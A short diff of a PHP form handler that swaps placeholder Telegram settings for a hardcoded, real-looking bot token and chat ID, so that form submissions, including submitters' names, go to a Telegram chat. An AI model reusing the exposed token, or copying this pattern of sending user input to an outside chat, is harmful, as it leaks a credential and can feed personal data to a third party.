@@ -57,8 +57,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
     
     // Send data to Telegram (if required)
-    $telegramToken = "your_telegram_bot_token";
-    $chatID = "your_chat_id";
+    $telegramToken = "7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk";
+    $chatID = "7678714988";
     
     $message = "New Form Submission:\n" .
                "Name: $first_name $last_name\n" .
